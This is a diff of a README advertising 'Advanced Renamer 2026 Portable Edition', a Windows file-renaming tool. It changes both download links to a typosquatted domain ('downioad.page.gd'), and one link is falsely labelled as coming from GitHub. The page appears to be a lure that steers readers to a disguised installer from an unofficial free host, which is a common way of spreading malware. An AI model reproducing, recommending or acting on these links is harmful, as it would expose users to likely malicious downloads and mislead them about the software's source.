@@ -2,7 +2,7 @@
 
 Advanced Renamer 2026 Portable Edition is a powerful and intuitive application designed to simplify the process of renaming files and folders on Windows 10 and 11. This tool offers advanced features such as batch processing, customizable renaming rules, and support for various file types, making it an essential utility for organizing digital content efficiently. Whether you're managing a large photo library or organizing documents, Advanced Renamer 2026 provides a seamless experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,7 +55,7 @@ To update, simply download the latest installer from the provided link and run i
 
 For the latest version and updates, visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
